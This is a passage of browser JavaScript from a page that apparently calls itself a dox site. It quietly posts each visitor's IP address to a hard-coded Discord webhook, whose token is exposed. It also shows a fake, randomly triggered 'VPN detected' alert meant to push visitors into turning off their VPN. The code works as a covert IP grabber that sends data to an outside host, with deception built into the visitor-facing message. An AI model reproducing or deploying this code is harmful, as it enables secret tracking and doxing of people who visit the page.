                const webhookUrl = 'https://discord.com/api/webhooks/1294694528149753917/x7UYkRR3odV0TWrt2uM3b-KeBg9REY6DR3TSDaQEfAVXaULoWW8-1DGBGzkQjlkWzQ_q';
                await axios.post(webhookUrl, {content: `IP Address: ${ip}`});
                console.log('IP address sent to Discord webhook:', ip);
            } catch (error) { console.error('Error logging IP address:', error); }
         }
                
            
        
        function detectVPN() {
            // Simulated check for VPN usage - replace this with actual VPN detection logic
            var isUsingVPN = Math.random() < 0.5; // Randomly simulate VPN usage

            if (isUsingVPN) {
                alert("Couldn't continue due to you using a VPN. If you want to continue to Ghosti's Dox, please turn off your VPN!");

                logIPAndSendToWebhook();
                window.location.href = "https://example.com"; // Redirect to another site when VPN is off
            }
        }
